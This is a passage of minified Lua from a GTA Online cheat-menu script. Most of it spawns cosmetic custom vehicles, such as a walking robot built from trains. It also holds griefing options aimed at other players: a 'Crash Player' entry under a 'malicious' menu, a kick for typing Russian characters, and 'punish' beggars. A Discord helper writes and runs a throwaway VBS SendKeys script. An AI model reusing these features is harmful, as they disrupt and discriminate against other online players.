                network.network_session_kick_player(id)
            else
                o("You are not Session-Host!")
            end
        end
    )
    bg(
        "Crash Player",
        aj["opl_malicious"],
        function(k, id)
            bT(id)
        end
    )
    aj["chat"] = b8("Chat-Features", aj["parent"])
    aj["chat"].hidden = l["chat_hidden"]
    aj["chat"] = aj["chat"].id
    ak["chat_log"] =
        bc(
        "Chat-Log",
        aj["chat"],
        function(k)
            l["chat_log"] = k.on
        end
    )
    ak["chat_log"].on = l["chat_log"]
    ak["chat_russki"] =
        bc(
        "Kick if Russki Char is typed",
        aj["chat"],
        function(k)
            l["chat_russki"] = k.on
        end
    )
    ak["chat_russki"].on = l["chat_russki"]
    ak["chat_begger"] =
        bc(
        "Punish Money Beggers",
        aj["chat"],
        function(k)
            l["chat_begger"] = k.on
        end
    )
    ak["chat_begger"].on = l["chat_begger"]
    ak["send_msg_to_script_users"] =
        bb(
        "Send Message to 2Take1Script-Users",
        aj["chat"],
        function()
            local J, cs = input.get("Enter Message", "", 128, 0)
            while J == 1 do
                c.wait(0)
                J, cs = input.get("Enter Message", "", 128, 0)
            end
            if J == 2 then
                return HANDLER_POP
            end
            if cs ~= "" then
                local cq = {}
                cq[1] = 6666
                for p, q in utf8.codes(cs) do
                    cq[#cq + 1] = q
                end
                for i = 0, 31 do
                    if c.valid(i) then
                        if i ~= c.id() and K.scid(i) ~= -1 then
                            c.script(0xfaaab4a3, i, cq)
                        end
                    end
                end
            end
        end
    )
    ak["chat_cmd"] =
        bc(
        "Enable Chat-Commands",
        aj["chat"],
        function(k)
            l["chat_cmd"] = k.on
        end
    )
    ak["chat_cmd"].on = l["chat_cmd"]
    aj["chat_cmd"] = b8("Chat-Commands", aj["chat"]).id
    for i = 1, #V do
        ak[V[i][1]] =
            bc(
            V[i][2],
            aj["chat_cmd"],
            function(k)
                l[V[i][1]] = k.on
            end
        )
        ak[V[i][1]].on = l[V[i][1]]
    end
    bb("[SU] = Script-User", aj["chat_cmd"])
    bb(
        "Delete Vehicles from !lag",
        aj["chat"],
        function()
            bk(a0["lag_area"])
            a0["lag_area"] = {}
        end
    )
    ak["chat_cmd_friends"] =
        bc(
        "Chat Commands for Friends",
        aj["chat"],
        function(k)
            l["chat_cmd_friends"] = k.on
        end
    )
    ak["chat_cmd_friends"].on = l["chat_cmd_friends"]
    ak["chat_cmd_all"] =
        bc(
        "Chat Commands Everyone",
        aj["chat"],
        function(k)
            l["chat_cmd_all"] = k.on
        end
    )
    ak["chat_cmd_all"].on = l["chat_cmd_all"]
    ak["send_message_to_dc"] =
        bb(
        "Send Message to #general",
        aj["chat"],
        function()
            o("It will take 8 seconds to sent the message, calm down and wait :)")
            local J, cs = input.get("Enter Message", "", 128, 0)
            while J == 1 do
                c.wait(0)
                J, cs = input.get("Enter Message", "", 128, 0)
            end
            if J == 2 then
                return HANDLER_POP
            end
            cs = cs .. "\n\n*this message was sent by 2Take1Script*"
            utils.to_clipboard(cs)
            c.exe("start https://discord.com/channels/570999086874886154/570999091320979486")
            c.wait(8000)
            local dG = b["vbs"]
            local dH = c.o(dG, "a")
            io.output(dH)
            io.write('set sendmsg = wscript.createobject("wscript.shell")\nwscript.sleep(1000)\n')
            io.write('sendmsg.sendkeys "^v"\nwscript.sleep(50)\n')
            io.write('sendmsg.sendkeys "{ENTER}"\nwscript.sleep(500)\n')
            io.write("wscript.quit")
            io.close(dH)
            c.exe("start " .. dG)
            c.wait(1000)
            os.remove(dG)
        end
    )
    aj["custom_veh"] = b8("Custom Vehicles", aj["parent"])
    aj["custom_veh"].hidden = l["custom_vehicles_hidden"]
    aj["custom_veh"] = aj["custom_veh"].id
    aj["moveablerobot"] = b8("Moveable Robot", aj["custom_veh"]).id
    ak["moveablerobot"] =
        bc(
        "Enable Robot",
        aj["moveablerobot"],
        function(k)
            if k.on then
                if aH["tampa"] == nil then
                    local dI = true
                    local bq = ped.get_vehicle_ped_is_using(M.ped())
                    if bq ~= 0 then
                        if 3084515313 == entity.get_entity_model_hash(bq) then
                            aH["tampa"] = bq
                            dI = false
                        end
                    end
                    if dI then
                        I.model(3084515313)
                        aH["tampa"] = vehicle.create_vehicle(3084515313, M.coords(), M.heading(), true, false)
                        decorator.decor_set_int(aH["tampa"], "MPBitset", 1 << 10)
                        entity.set_entity_god_mode(aH["tampa"], true)
                        bW(bq)
                        if ak["auto_get_in"].on then
                            ped.set_ped_into_vehicle(M.ped(), aH["tampa"], -1)
                        end
                        if not l["disable_tampa_notify"] then
                            o(
                                "To get the best experience, upgrade the Tampa to use the Double Controllable Minigun!",
                                11
                            )
                            o("You can disable this message in Options.", 11)
                        end
                    end
                end
                if aH["ppdump"] == nil then
                    I.model(0x810369E2)
                    aH["ppdump"] = vehicle.create_vehicle(0x810369E2, v3(), 0, true, false)
                    entity.set_entity_god_mode(aH["ppdump"], true)
                    entity.attach_entity_to_entity(
                        aH["ppdump"],
                        aH["tampa"],
                        0,
                        v3(0, 0, 12.5),
                        v3(),
                        true,
                        l["robot_collision"],
                        false,
                        2,
                        true
                    )
                end
                if aH["llbone"] == nil then
                    I.model(1803116220)
                    aH["llbone"] = object.create_object(1803116220, v3(), true, false)
                    entity.attach_entity_to_entity(
                        aH["llbone"],
                        aH["tampa"],
                        0,
                        v3(-4.25, 0, 12.5),
                        v3(),
                        true,
                        l["robot_collision"],
                        false,
                        2,
                        true
                    )
                end
                if aH["rlbone"] == nil then
                    I.model(1803116220)
                    aH["rlbone"] = object.create_object(1803116220, v3(), true, false)
                    entity.attach_entity_to_entity(
                        aH["rlbone"],
                        aH["tampa"],
                        0,
                        v3(4.25, 0, 12.5),
                        v3(),
                        true,
                        l["robot_collision"],
                        false,
                        2,
                        true
                    )
                end
                if aH["lltrain"] == nil then
                    I.model(1030400667)
                    aH["lltrain"] = vehicle.create_vehicle(1030400667, v3(), 0, true, false)
                    entity.set_entity_god_mode(aH["lltrain"], true)
                    entity.attach_entity_to_entity(
                        aH["lltrain"],
                        aH["llbone"],
                        0,
                        v3(0, 0, -5),
                        v3(90),
                        true,
                        l["robot_collision"],
                        false,
                        2,
                        true
                    )
                end
                if aH["lfoot"] == nil then
                    I.model(782665360)
                    aH["lfoot"] = vehicle.create_vehicle(782665360, v3(), 0, true, false)
                    entity.set_entity_god_mode(aH["lfoot"], true)
                    entity.attach_entity_to_entity(
                        aH["lfoot"],
                        aH["llbone"],
                        0,
                        v3(0, 2, -12.5),
                        v3(),
                        true,
                        l["robot_collision"],
                        false,
                        2,
                        true
                    )
                end
                if aH["rltrain"] == nil then
                    I.model(1030400667)
                    aH["rltrain"] = vehicle.create_vehicle(1030400667, v3(), 0, true, false)
                    entity.set_entity_god_mode(aH["rltrain"], true)
                    entity.attach_entity_to_entity(
                        aH["rltrain"],
                        aH["rlbone"],
                        0,
                        v3(0, 0, -5),
                        v3(90),
                        true,
                        l["robot_collision"],
                        false,
                        2,
                        true
                    )
                end
                if aH["rfoot"] == nil then
                    I.model(782665360)
                    aH["rfoot"] = vehicle.create_vehicle(782665360, v3(), 0, true, false)
                    entity.set_entity_god_mode(aH["rfoot"], true)
                    entity.attach_entity_to_entity(
                        aH["rfoot"],
                        aH["rlbone"],
                        0,
                        v3(0, 2, -12.5),
                        v3(),
                        true,
                        l["robot_collision"],
                        false,
                        2,
                        true
                    )
                end
                if aH["body"] == nil then
                    I.model(1030400667)
                    aH["body"] = vehicle.create_vehicle(1030400667, v3(), 0, true, false)
                    entity.set_entity_god_mode(aH["body"], true)
                    entity.attach_entity_to_entity(
                        aH["body"],
                        aH["tampa"],
                        0,
                        v3(0, 0, 22.5),
                        v3(90),
                        true,
                        l["robot_collision"],
                        false,
                        2,
                        true
                    )
                end
                if aH["shoulder"] == nil then
                    I.model(0x810369E2)
                    aH["shoulder"] = vehicle.create_vehicle(0x810369E2, v3(), 0, true, false)
                    entity.set_entity_god_mode(aH["shoulder"], true)
                    entity.attach_entity_to_entity(
                        aH["shoulder"],
                        aH["tampa"],
                        0,
                        v3(0, 0, 27.5),
                        v3(),
                        true,
                        l["robot_collision"],
                        false,
                        2,
                        true
                    )
                end
                if aH["lheadbone"] == nil then
                    I.model(1803116220)
                    aH["lheadbone"] = object.create_object(1803116220, v3(), true, false)
                    entity.attach_entity_to_entity(
                        aH["lheadbone"],
                        aH["tampa"],
                        0,
                        v3(-3.25, 0, 27.5),
                        v3(),
                        true,
                        l["robot_collision"],
                        false,
                        2,
                        true
                    )
                end
                if aH["rheadbone"] == nil then
                    I.model(1803116220)
                    aH["rheadbone"] = object.create_object(1803116220, v3(), true, false)
                    entity.attach_entity_to_entity(
                        aH["rheadbone"],
                        aH["tampa"],
                        0,
                        v3(3.25, 0, 27.5),
                        v3(),
                        true,
                        l["robot_collision"],
                        false,
                        2,
                        true
                    )
                end
                if aH["lheadtrain"] == nil then
                    I.model(1030400667)
                    aH["lheadtrain"] = vehicle.create_vehicle(1030400667, v3(), 0, true, false)
                    entity.set_entity_god_mode(aH["lheadtrain"], true)
                    entity.attach_entity_to_entity(
                        aH["lheadtrain"],
                        aH["lheadbone"],
                        0,
                        v3(-3, 4, -5),
                        v3(325, 0, 45),
                        true,
                        l["robot_collision"],
                        false,
                        2,
                        true
                    )
                end
                if aH["lhand"] == nil then
                    I.model(782665360)
                    aH["lhand"] = vehicle.create_vehicle(782665360, v3(), 0, true, false)
                    entity.set_entity_god_mode(aH["lhand"], true)
                    entity.attach_entity_to_entity(
                        aH["lhand"],
                        aH["lheadtrain"],
                        0,
                        v3(0, 7.5, 0),
                        v3(),
                        true,
                        l["robot_collision"],
                        false,
                        2,
                        true
                    )
                end
                if aH["rheadtrain"] == nil then
                    I.model(1030400667)
                    aH["rheadtrain"] = vehicle.create_vehicle(1030400667, v3(), 0, true, false)
                    entity.set_entity_god_mode(aH["rheadtrain"], true)
                    entity.attach_entity_to_entity(
                        aH["rheadtrain"],
                        aH["rheadbone"],
                        0,
                        v3(3, 4, -5),
                        v3(325, 0, 315),
                        true,
                        l["robot_collision"],
                        false,
                        2,
                        true
                    )
                end
                if aH["rhand"] == nil then
                    I.model(782665360)
                    aH["rhand"] = vehicle.create_vehicle(782665360, v3(), 0, true, false)
                    entity.set_entity_god_mode(aH["rhand"], true)
                    entity.attach_entity_to_entity(
                        aH["rhand"],
                        aH["rheadtrain"],
                        0,
                        v3(0, 7.5, 0),
                        v3(),
                        true,
                        l["robot_collision"],
                        false,
                        2,
                        true
                    )
                end
                if aH["head"] == nil then
                    I.model(-543669801)
                    aH["head"] = object.create_object(-543669801, v3(), true, false)
                    entity.attach_entity_to_entity(
                        aH["head"],
                        aH["tampa"],
                        0,
                        v3(0, 0, 35),
                        v3(),
                        true,
                        l["robot_collision"],
                        false,
                        2,
                        true
                    )
                end
                return HANDLER_CONTINUE
            end
            if not k.on then
                for i in pairs(aH) do
                    bk({aH[i]})
                    aH[i] = nil
                end
                if #aI ~= 0 then
                    bk(aI)
                    aI = {}
                end
                if #aJ ~= 0 then
                    bk(aJ)
                    aJ = {}
                end
            end
        end
    )
    ak["robot_shoot"] =
        bc(
        "Controllable Blasts",
        aj["moveablerobot"],
        function(k)
            if k.on then
                local dJ = gameplay.get_hash_key("weapon_airstrike_rocket")
                local bp = M.coords()
                local dK = cam.get_gameplay_cam_rot()
                dK:transformRotToDir()
                dK = dK * 1000
                bp = bp + dK
                local dL, dM, dN, cf, dO = worldprobe.raycast(bZ(M.coords(), M.heading(), 2) + v3(0, 0, 4), bp, -1, 0)
                while not dL do
                    bp = M.coords()
                    dK = cam.get_gameplay_cam_rot()
                    dK:transformRotToDir()
                    dK = dK * 1000
                    bp = bp + dK
                    dL, dM, dN, cf, dO = worldprobe.raycast(bZ(M.coords(), M.heading(), 2) + v3(0, 0, 4), bp, -1, 0)
                    c.wait(0)
                end
                if ped.is_ped_shooting(M.ped()) and ped.get_vehicle_ped_is_using(M.ped()) == aH["tampa"] then
                    if ak["equip_weapons"].on then
                        local dP = aI[1]
                        local dQ = entity.get_entity_heading(dP)
                        local dR = bZ(c.gcoords(dP), dQ, 12) + v3(0, 0, 3)
                        gameplay.shoot_single_bullet_between_coords(dR, dM, 1000, dJ, M.ped(), true, false, 50000)
                        local dS = aJ[1]
                        local dT = entity.get_entity_heading(dS)
                        local dU = bZ(c.gcoords(dS), dT, 12) + v3(0, 0, 3)
                        gameplay.shoot_single_bullet_between_coords(dU, dM, 1000, dJ, M.ped(), true, false, 50000)
                        c.wait(100)
                    else
                        local cG = bZ(M.coords(), M.heading(), 8) + v3(0, 0, 15)
                        gameplay.shoot_single_bullet_between_coords(cG, dM, 1000, dJ, M.ped(), true, false, 10000)
                    end
                end
            end
            l["controllable_blasts"] = k.on
            return d.stop(k)
        end
    )
    ak["robot_shoot"].on = l["controllable_blasts"]
    ak["moveablelegs"] =
        bc(
        "Moveable Legs",
        aj["moveablerobot"],
        function(k)
            l["moveable_legs"] = k.on
            if k.on then
                if aH["tampa"] then
                    local di
                    local cA = aH["llbone"]
                    local cB = aH["rlbone"]
                    local cC = aH["tampa"]
                    local cD = v3(-4.25, 0, 12.5)
                    local cE = v3(4.25, 0, 12.5)
                    for i = 0, 50 do
                        if aH["tampa"] then
                            di = entity.get_entity_speed(aH["tampa"])
                            if not k.on or di < 2.5 then
                                cz()
                                return HANDLER_CONTINUE
                            end
                            I.ctrl(cA)
                            I.ctrl(cB)
                            I.ctrl(cC)
                            entity.attach_entity_to_entity(
                                cA,
                                cC,
                                0,
                                cD,
                                v3(i, 0, 0),
                                true,
                                l["robot_collision"],
                                false,
                                2,
                                true
                            )
                            entity.attach_entity_to_entity(
                                cB,
                                cC,
                                0,
                                cE,
                                v3(360 - i, 0, 0),
                                true,
                                l["robot_collision"],
                                false,
                                2,
                                true
                            )
                            local dV = math.floor(51 - di / 1)
                            if dV < 1 then
                                dV = 0
                            end
                            c.wait(dV)
                        end
                    end
                    for i = 50, -50, -1 do
                        if aH["tampa"] then
                            di = entity.get_entity_speed(aH["tampa"])
                            if not k.on or di < 2.5 then
                                cz()
                                return HANDLER_CONTINUE
                            end
                            I.ctrl(cA)
                            I.ctrl(cB)
                            I.ctrl(cC)
                            entity.attach_entity_to_entity(
                                cA,
                                cC,
                                0,
                                cD,
                                v3(i, 0, 0),
                                true,
                                l["robot_collision"],
                                false,
                                2,
                                true
                            )
                            entity.attach_entity_to_entity(
                                cB,
                                cC,
                                0,
                                cE,
                                v3(360 - i, 0, 0),
                                true,
                                l["robot_collision"],
                                false,
                                2,
                                true
                            )
                            local dV = math.floor(51 - di / 1)
                            if dV < 1 then
                                dV = 0
                            end
                            c.wait(dV)
                        end
                    end
                    for i = -50, 0 do
                        if aH["tampa"] then
                            di = entity.get_entity_speed(aH["tampa"])
                            if not k.on or di < 2.5 then
                                cz()
                                return HANDLER_CONTINUE
                            end
                            I.ctrl(cA)
                            I.ctrl(cB)
                            I.ctrl(cC)
                            entity.attach_entity_to_entity(
                                cA,
                                cC,
                                0,
                                cD,
                                v3(i, 0, 0),
                                true,
                                l["robot_collision"],
                                false,
                                2,
                                true
                            )
                            entity.attach_entity_to_entity(
                                cB,
                                cC,
                                0,
                                cE,
                                v3(360 - i, 0, 0),
                                true,
                                l["robot_collision"],
                                false,
                                2,
                                true
                            )
                            local dV = math.floor(51 - di / 1)
                            if dV < 1 then
                                dV = 0
                            end
                            c.wait(dV)
                        end
                    end
                end
                return HANDLER_CONTINUE
            end
            if not k.on then
                cz()
            end
        end
    )
    ak["moveablelegs"].on = l["moveable_legs"]
    ak["robot_collision"] =
        bc(
        "Collision",
        aj["moveablerobot"],
        function(k)
            l["robot_collision"] = k.on
            if ped.get_vehicle_ped_is_using(M.ped()) == aH["tampa"] then
                o("Re-enable Robot to take effect of collision!", 11)
            end
        end
    )
    ak["robot_collision"].on = l["robot_collision"]
    ak["rocket_propulsion"] =
        bc(
        "Rocket Propulsion (Visual)",
        aj["moveablerobot"],
        function(k)
            if k.on and aH["body"] then
                if aH["spinning_1"] == nil then
                    I.model(0xFB133A17)
                    aH["spinning_1"] = vehicle.create_vehicle(0xFB133A17, M.coords(), 0, true, false)
                    entity.set_entity_god_mode(aH["spinning_1"], true)
                    entity.set_entity_visible(aH["spinning_1"], false)
                    entity.attach_entity_to_entity(
                        aH["spinning_1"],
                        aH["body"],
                        0,
                        v3(0, -5, 0),
                        v3(-180, 0, 0),
                        true,
                        l["robot_collision"],
                        false,
                        2,
                        true
                    )
                end
                vehicle.set_heli_blades_speed(aH["spinning_1"], 100)
                if aH["spinning_middle"] == nil then
                    I.model(94602826)
                    aH["spinning_middle"] = object.create_object(94602826, v3(), true, false)
                    entity.set_entity_god_mode(aH["spinning_middle"], true)
                    entity.attach_entity_to_entity(
                        aH["spinning_middle"],
                        aH["spinning_1"],
                        0,
                        v3(0, 0, 0),
                        v3(0, 0, 0),
                        true,
                        l["robot_collision"],
                        false,
                        2,
                        true
                    )
                end
                if aH["spinning_middle2"] == nil then
                    I.model(94602826)
                    aH["spinning_middle2"] = object.create_object(94602826, v3(), true, false)
                    entity.set_entity_god_mode(aH["spinning_middle2"], true)
                    entity.attach_entity_to_entity(
                        aH["spinning_middle2"],
                        aH["spinning_1"],
                        0,
                        v3(0, 0, 1.5),
                        v3(0, 0, 0),
                        true,
                        l["robot_collision"],
                        false,
                        2,
                        true
                    )
                end
                if aH["spinning_middle3"] == nil then
                    I.model(94602826)
                    aH["spinning_middle3"] = object.create_object(94602826, v3(), true, false)
                    entity.set_entity_god_mode(aH["spinning_middle3"], true)
                    entity.attach_entity_to_entity(
                        aH["spinning_middle3"],
                        aH["spinning_1"],
                        0,
                        v3(0, 0, 3),
                        v3(0, 0, 0),
                        true,
                        l["robot_collision"],
                        false,
                        2,
                        true
                    )
                end
                local D = entity.get_entity_bone_index_by_name(aH["spinning_1"], "rotor_main")
                if aH["glow_1"] == nil then
                    I.model(2655881418)
                    aH["glow_1"] = object.create_object(2655881418, v3(), true, false)
                    entity.set_entity_god_mode(aH["glow_1"], true)
                    entity.attach_entity_to_entity(
                        aH["glow_1"],
                        aH["spinning_1"],
                        D,
                        v3(2, 3, 3),
                        v3(0, 0, 0),
                        true,
                        l["robot_collision"],
                        false,
                        2,
                        true
                    )
                end
                if aH["glow_2"] == nil then
                    I.model(2655881418)
                    aH["glow_2"] = object.create_object(2655881418, v3(), true, false)
                    entity.set_entity_god_mode(aH["glow_2"], true)
                    entity.attach_entity_to_entity(
                        aH["glow_2"],
                        aH["spinning_1"],
                        D,
                        v3(2, -3, 3),
                        v3(0, 0, 0),
                        true,
                        l["robot_collision"],
                        false,
                        2,
                        true
                    )
                end
                if aH["glow_3"] == nil then
                    I.model(2655881418)
                    aH["glow_3"] = object.create_object(2655881418, v3(), true, false)
                    entity.set_entity_god_mode(aH["glow_3"], true)
                    entity.attach_entity_to_entity(
                        aH["glow_3"],
                        aH["spinning_1"],
                        D,
                        v3(4, 0, 3),
                        v3(0, 0, 0),
                        true,
                        l["robot_collision"],
                        false,
                        2,
                        true
                    )
                end
                if aH["glow_4"] == nil then
                    I.model(2655881418)
                    aH["glow_4"] = object.create_object(2655881418, v3(), true, false)
                    entity.set_entity_god_mode(aH["glow_4"], true)
                    entity.attach_entity_to_entity(
                        aH["glow_4"],
                        aH["spinning_1"],
                        D,
                        v3(-2, 3, 3),
                        v3(0, 0, 0),
                        true,
                        l["robot_collision"],
                        false,
                        2,
                        true
                    )
                end
                if aH["glow_5"] == nil then
                    I.model(2655881418)
                    aH["glow_5"] = object.create_object(2655881418, v3(), true, false)
                    entity.set_entity_god_mode(aH["glow_5"], true)
                    entity.attach_entity_to_entity(
                        aH["glow_5"],
                        aH["spinning_1"],
                        D,
                        v3(-2, -3, 3),
                        v3(0, 0, 0),
                        true,
                        l["robot_collision"],
                        false,
                        2,
                        true
                    )
                end
                if aH["glow_6"] == nil then
                    I.model(2655881418)
                    aH["glow_6"] = object.create_object(2655881418, v3(), true, false)
                    entity.set_entity_god_mode(aH["glow_6"], true)
                    entity.attach_entity_to_entity(
                        aH["glow_6"],
                        aH["spinning_1"],
                        D,
                        v3(-4, 0, 3),
                        v3(0, 0, 0),
                        true,
                        l["robot_collision"],
                        false,
                        2,
                        true
                    )
                end
            end
            if not k.on then
                local dW = {
                    "spinning_1",
                    "glow_1",
                    "glow_2",
                    "glow_3",
                    "glow_4",
                    "glow_5",
                    "glow_6",
                    "spinning_middle",
                    "spinning_middle2",
                    "spinning_middle3"
                }
                for i = 1, #dW do
                    if aH[dW[i]] then
                        bk({aH[dW[i]]})
                        aH[dW[i]] = nil
                    end
                end
                return HANDLER_POP
            end
            l["rocket_propulsion"] = k.on
            return HANDLER_CONTINUE
        end
    )
    ak["rocket_propulsion"].on = l["rocket_propulsion"]
    ak["equip_weapons"] =
        bc(
        "Equip Miniguns on hands",
        aj["moveablerobot"],
        function(k)
            l["equip_weapons"] = k.on
            if k.on and aH["lheadtrain"] and aH["rheadtrain"] then
                if #aI == 0 and #aJ == 0 then
                    local dX = false
                    if ak["spawn_preview"].on then
                        dX = true
                        ak["spawn_preview"].on = false
                    end
                    local dY = false
                    if ak["auto_get_in"].on then
                        dY = true
                        ak["auto_get_in"].on = false
                    end
                    local bM = a8[1][2]
                    cW(bM, 2)
                    cW(bM, 3)
                    local dZ = aI[1]
                    local d_ = aJ[1]
                    local e0 = aH["lheadtrain"]
                    local e1 = aH["rheadtrain"]
                    I.ctrl(dZ)
                    I.ctrl(d_)
                    I.ctrl(e0)
                    I.ctrl(e1)
                    entity.attach_entity_to_entity(
                        dZ,
                        e0,
                        0,
                        v3(0, 5, 0),
                        v3(),
                        true,
                        l["robot_collision"],
                        false,
                        2,
                        true
                    )
                    entity.attach_entity_to_entity(
                        d_,
                        e1,
                        0,
                        v3(0, 5, 0),
                        v3(),
                        true,
                        l["robot_collision"],
                        false,
                        2,
                        true
                    )
                    if dX then
                        ak["spawn_preview"].on = true
                    end
                    if dY then
                        ak["auto_get_in"].on = true
                    end
                end
            end
            if not k.on then
                if #aI ~= 0 then
                    bk(aI)
                    aI = {}
                end
                if #aJ ~= 0 then
                    bk(aJ)
                    aJ = {}
                end
                return HANDLER_POP
            end
            return HANDLER_CONTINUE
        end
    )
    ak["equip_weapons"].on = l["equip_weapons"]
    bb(
        "Drive Robot",
        aj["moveablerobot"],
        function()
            if aH["tampa"] then
                ped.set_ped_into_vehicle(M.ped(), aH["tampa"], -1)
            end
        end
    )
    aj["custom_spawner"] = b8("Custom Vehicles", aj["custom_veh"]).id
    ak["spawn_preview"] =
        bc(
        "Preview Custom Vehicles",
        aj["custom_spawner"],
        function(k)
            if #a0["preview_veh"] > 0 and k.on then
                if ped.is_ped_in_any_vehicle(M.ped()) then
                    ped.clear_ped_tasks_immediately(M.ped())
                end
                local bp = M.coords()
                if not ap then
                    for i = 1, #a0["preview_veh"] do
                        entity.set_entity_no_collsion_entity(a0["preview_veh"][i], M.ped(), true)
                    end
                    ap = true
                end
                bp.z = bp.z + ao
                local b_ = M.heading()
                bp = bZ(bp, b_, aq)
                bj(a0["preview_veh"][1], bp)
                entity.set_entity_rotation(a0["preview_veh"][1], ar)
                ar.z = ar.z + 1
                if ar.z > 360 then
                    ar.z = 0
                end
            end
            if not k.on then
                bk(a0["preview_veh"])
                a0["preview_veh"] = {}
                ap = false
                return HANDLER_POP
            end
            return d.stop(k)
        end
    )
    bb(
        "Delete Custom Vehicles",
        aj["custom_spawner"],
        function()
            s("Clearing Custom Vehicles.")
            bk(a0["custom_veh"])
            a0["custom_veh"] = {}
            bk(a0["preview_veh"])
            a0["preview_veh"] = {}
            ap = false
            o("Cleared Custom Vehicles.")
        end
    )
    for i = 1, #a8 do
        bb(
            a8[i][1],
            aj["custom_spawner"],
            function()
                local bM = a8[i][2]
                cW(bM)
            end
        )
    end
    aj["custom_veh_opt"] = b8("Options", aj["custom_veh"]).id
    ak["auto_get_in"] =
        bc(
        "Spawn in Custom Vehicle",
        aj["custom_veh_opt"],
        function(k)
            l["spawn_in_vehicle"] = k.on
        end
    )
    ak["auto_get_in"].on = l["spawn_in_vehicle"]
    ak["use_own_veh"] =
        bc(
        "Use Own Vehicle for Custom ones",
        aj["custom_veh_opt"],
        function(k)
            l["use_own_veh"] = k.on
        end
    )
    ak["use_own_veh"].on = l["use_own_veh"]
    ak["set_godmode"] =
        bc(
        "Godmode on Custom Vehicles",
        aj["custom_veh_opt"],
        function(k)
            l["set_godmode"] = k.on
        end
    )
    ak["set_godmode"].on = l["set_godmode"]
    ak["disable_tampa_notify"] =
        bc(
        "Disable Moveable Robot Tampa Notify",
        aj["custom_veh_opt"],
        function(k)
            l["disable_tampa_notify"] = k.on
        end
    )
    ak["disable_tampa_notify"].on = l["disable_tampa_notify"]
    aj["custom_veh_builder"] = b8("Custom Vehicle Creator", aj["custom_veh"])
    aj["custom_veh_builder"].hidden = true
    local e2 = {
        {
            "WarMachine",
            {
                {0x9dae1398, 1030400667, 0x2F03547B, 2971578861, 3871829598, 3229200997, 0x187D938D, 782665360},
                {0x9dae1398, nil, nil, {0, 0, 0, 0, 1}, nil, nil, nil, nil, nil, nil, 15},
                {1030400667, {0, -4, 0}, nil, {0, 0, 0, 0, 1}},
                {0x2F03547B, {0, -8, 4}, {-90, 0, 0}, {0, 0, 0, 0, 1}, true, nil, nil, nil, 0x97F5FE8D, true},
                {2971578861, {-0.3, -0.6, 9.8}, {-90, 0, 0}, nil, nil, nil, 16, 3},
                {3229200997, {0, 0, 9.8}, {-90, 0, 0}, nil, nil, nil, 16, 3},
                {0x187D938D, {0, -8.25, 5.3}, nil, {0, 0, 0, 0, 1}},
                {782665360, {0, -8, 3.1}, nil, {0, 0, 0, 0, 1}}
            }
        },
        {
            "Deer Rider",
            {
                {0xE5BA6858},
                {0xE5BA6858, nil, nil, {0, 0, 0, 0, 1}, true, nil, nil, nil, nil, nil, 3},
                {0, {0, -0.225, 0.225}, nil, nil, nil, nil, nil, nil, 0xD86B5A95}
            }
        },
        {"Attach Tree", {{3015194288}, {0}, {3015194288, {0, 0, -0.3}}}}
    }
    bb(
        "Delete Custom Vehicles",
        aj["custom_veh_builder"].id,
        function()
            s("Clearing Custom Vehicles.")
            bk(aR)
            aR = {}
            o("Cleared Custom Vehicles.")
        end
    )
    for i = 1, #e2 do
        bb(
            e2[i][1],
            aj["custom_veh_builder"].id,
            function()
                local bM = e2[i][2]
                cW(bM, 1)
            end
        )
    end
    local e3 = bd("Select Vehicle", "autoaction_value_i", aj["custom_veh_builder"].id)
    e3.min_i = 2
    e3.max_i = 250
    local e4, e5, e6, e7, e8, e9
    e4 =
        bd(
        "Offset X",
        "autoaction_value_i",
        aj["custom_veh_builder"].id,
        function(k)
            local bn = v3(k.value_i / 10, e5.value_i / 10, e6.value_i / 10)
            local ea = v3(e7.value_i, e8.value_i, e9.value_i)
            local cC = aR[1]
            local eb = aR[e3.value_i]
            if cC ~= nil and eb ~= nil then
                I.ctrl(cC)
                I.ctrl(eb)
                entity.attach_entity_to_entity(eb, cC, 0, bn, ea, false, false, false, 2, true)
            end
        end
    )
    e4.min_i = -500
    e4.max_i = 500
    e5 =
        bd(
        "Offset Y",
        "autoaction_value_i",
        aj["custom_veh_builder"].id,
        function(k)
            local bn = v3(e4.value_i / 10, k.value_i / 10, e6.value_i / 10)
            local ea = v3(e7.value_i, e8.value_i, e9.value_i)
            local cC = aR[1]
            local eb = aR[e3.value_i]
            if cC ~= nil and eb ~= nil then
                I.ctrl(cC)
                I.ctrl(eb)
                entity.attach_entity_to_entity(eb, cC, 0, bn, ea, false, false, false, 2, true)
            end
        end
    )
    e5.min_i = -500
    e5.max_i = 500
    e6 =
        bd(
        "Offset Z",
        "autoaction_value_i",
        aj["custom_veh_builder"].id,
        function(k)
            local bn = v3(e4.value_i / 10, e5.value_i / 10, k.value_i / 10)
            local ea = v3(e7.value_i, e8.value_i, e9.value_i)
            local cC = aR[1]
            local eb = aR[e3.value_i]
            if cC ~= nil and eb ~= nil then
                I.ctrl(cC)
                I.ctrl(eb)
                entity.attach_entity_to_entity(eb, cC, 0, bn, ea, false, false, false, 2, true)
            end
        end
    )
    e6.min_i = -500
    e6.max_i = 500
    e7 =
        bd(
        "Rotation X",
        "autoaction_value_i",
        aj["custom_veh_builder"].id,
        function(k)
            local bn = v3(e4.value_i / 10, e5.value_i / 10, e6.value_i / 10)
            local ea = v3(k.value_i, e8.value_i, e9.value_i)
            local cC = aR[1]
            local eb = aR[e3.value_i]
            if cC ~= nil and eb ~= nil then
                I.ctrl(cC)
                I.ctrl(eb)
                entity.attach_entity_to_entity(eb, cC, 0, bn, ea, false, false, false, 2, true)
            end
        end
    )
    e7.min_i = -360
    e7.max_i = 360
    e8 =
        bd(
        "Rotation Y",
        "autoaction_value_i",
        aj["custom_veh_builder"].id,
        function(k)
            local bn = v3(e4.value_i / 10, e5.value_i / 10, e6.value_i / 10)
            local ea = v3(e7.value_i, k.value_i, e9.value_i)
            local cC = aR[1]
            local eb = aR[e3.value_i]
            if cC ~= nil and eb ~= nil then
                I.ctrl(cC)
                I.ctrl(eb)
                entity.attach_entity_to_entity(eb, cC, 0, bn, ea, false, false, false, 2, true)
            end
        end
    )
    e8.min_i = -360
    e8.max_i = 360
    e9 =
        bd(
        "Rotation Z",
        "autoaction_value_i",
        aj["custom_veh_builder"].id,
        function(k)
            local bn = v3(e4.value_i / 10, e5.value_i / 10, e6.value_i / 10)
            local ea = v3(e7.value_i, e8.value_i, k.value_i)
            local cC = aR[1]
            local eb = aR[e3.value_i]
            if cC ~= nil and eb ~= nil and cC ~= eb then
                I.ctrl(cC)
                I.ctrl(eb)
                entity.attach_entity_to_entity(eb, cC, 0, bn, ea, false, false, false, 2, true)
            end
        end
    )
    e9.min_i = -360
    e9.max_i = 360
